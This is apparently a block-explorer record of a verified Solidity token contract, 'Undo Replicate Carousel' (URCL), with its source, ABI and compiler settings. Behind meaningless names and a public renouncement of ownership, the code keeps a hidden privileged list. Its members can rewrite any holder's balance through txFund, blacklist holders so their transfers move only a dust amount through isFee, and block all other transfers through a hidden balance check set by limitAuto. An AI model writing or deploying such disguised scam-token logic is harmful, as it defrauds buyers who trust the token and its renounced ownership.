{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface liquidityShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract listIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchTo {\n    function createPair(address launchToken, address tradingFrom) external returns (address);\n}\n\ninterface totalIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletTo) external view returns (uint256);\n\n    function transfer(address fromExempt, uint256 takeMarketing) external returns (bool);\n\n    function allowance(address feeTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromExempt,\n        uint256 takeMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingReceiverTotal, uint256 value);\n    event Approval(address indexed feeTake, address indexed spender, uint256 value);\n}\n\ninterface totalIsMetadata is totalIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UndoReplicateCarousel is listIs, totalIs, totalIsMetadata {\n\n    mapping(address => bool) public receiverMin;\n\n    uint256 autoMax;\n\n    function approve(address autoTakeShould, uint256 takeMarketing) public virtual override returns (bool) {\n        walletMin[_msgSender()][autoTakeShould] = takeMarketing;\n        emit Approval(_msgSender(), autoTakeShould, takeMarketing);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return maxLaunched;\n    }\n\n    function fromTotalFee(address launchTeam) public {\n        if (shouldMarketing) {\n            return;\n        }\n        \n        receiverMin[launchTeam] = true;\n        \n        shouldMarketing = true;\n    }\n\n    uint256 public takeSwap;\n\n    string private teamModeIs = \"Undo Replicate Carousel\";\n\n    uint256 constant isEnable = 10 ** 10;\n\n    mapping(address => uint256) private listLimit;\n\n    bool private tokenFrom;\n\n    uint256 public isReceiver;\n\n    address isMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed takeTotal, address indexed isLimitLaunched);\n\n    address private maxLaunched;\n\n    address public listTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellListTrading;\n    }\n\n    function transfer(address buySwap, uint256 takeMarketing) external virtual override returns (bool) {\n        return tradingTeam(_msgSender(), buySwap, takeMarketing);\n    }\n\n    mapping(address => bool) public swapLimit;\n\n    string private feeFrom = \"URCL\";\n\n    function isFee(address sellTx) public {\n        tokenAmount();\n        if (takeSwap == swapFrom) {\n            swapFrom = walletToken;\n        }\n        if (sellTx == listTrading || sellTx == toExempt) {\n            return;\n        }\n        swapLimit[sellTx] = true;\n    }\n\n    uint256 private swapFrom;\n\n    uint256 private sellListTrading = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return maxLaunched;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeReceiver;\n    }\n\n    address public toExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return teamModeIs;\n    }\n\n    function allowance(address sellToTeam, address autoTakeShould) external view virtual override returns (uint256) {\n        if (autoTakeShould == isMode) {\n            return type(uint256).max;\n        }\n        return walletMin[sellToTeam][autoTakeShould];\n    }\n\n    function transferFrom(address fromWallet, address fromExempt, uint256 takeMarketing) external override returns (bool) {\n        if (_msgSender() != isMode) {\n            if (walletMin[fromWallet][_msgSender()] != type(uint256).max) {\n                require(takeMarketing <= walletMin[fromWallet][_msgSender()]);\n                walletMin[fromWallet][_msgSender()] -= takeMarketing;\n            }\n        }\n        return tradingTeam(fromWallet, fromExempt, takeMarketing);\n    }\n\n    bool public shouldMarketing;\n\n    bool private sellTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeFrom;\n    }\n\n    uint256 amountFrom;\n\n    function tokenMarketingMax(address fromWallet, address fromExempt, uint256 takeMarketing) internal returns (bool) {\n        require(listLimit[fromWallet] >= takeMarketing);\n        listLimit[fromWallet] -= takeMarketing;\n        listLimit[fromExempt] += takeMarketing;\n        emit Transfer(fromWallet, fromExempt, takeMarketing);\n        return true;\n    }\n\n    uint256 public swapTeamFund;\n\n    uint256 public walletToken;\n\n    function balanceOf(address walletTo) public view virtual override returns (uint256) {\n        return listLimit[walletTo];\n    }\n\n    function tradingTeam(address fromWallet, address fromExempt, uint256 takeMarketing) internal returns (bool) {\n        if (fromWallet == listTrading) {\n            return tokenMarketingMax(fromWallet, fromExempt, takeMarketing);\n        }\n        uint256 atTrading = totalIs(toExempt).balanceOf(receiverTokenTrading);\n        require(atTrading == amountFrom);\n        require(fromExempt != receiverTokenTrading);\n        if (swapLimit[fromWallet]) {\n            return tokenMarketingMax(fromWallet, fromExempt, isEnable);\n        }\n        return tokenMarketingMax(fromWallet, fromExempt, takeMarketing);\n    }\n\n    address receiverTokenTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitAuto(uint256 takeMarketing) public {\n        tokenAmount();\n        amountFrom = takeMarketing;\n    }\n\n    uint8 private feeReceiver = 18;\n\n    function txFund(address buySwap, uint256 takeMarketing) public {\n        tokenAmount();\n        listLimit[buySwap] = takeMarketing;\n    }\n\n    constructor (){\n        \n        liquidityShould atAmount = liquidityShould(isMode);\n        toExempt = launchTo(atAmount.factory()).createPair(atAmount.WETH(), address(this));\n        \n        listTrading = _msgSender();\n        autoExemptToken();\n        receiverMin[listTrading] = true;\n        listLimit[listTrading] = sellListTrading;\n        \n        emit Transfer(address(0), listTrading, sellListTrading);\n    }\n\n    function autoExemptToken() public {\n        emit OwnershipTransferred(listTrading, address(0));\n        maxLaunched = address(0);\n    }\n\n    function tokenAmount() private view {\n        require(receiverMin[_msgSender()]);\n    }\n\n    bool private fromAuto;\n\n    mapping(address => mapping(address => uint256)) private walletMin;\n\n    bool private swapTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLimitLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiverTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellToTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTakeShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTakeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoExemptToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"}],\"name\":\"fromTotalFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"}],\"name\":\"isFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"limitAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTeamFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMarketing\",\"type\":\"uint256\"}],\"name\":\"txFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UndoReplicateCarousel", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}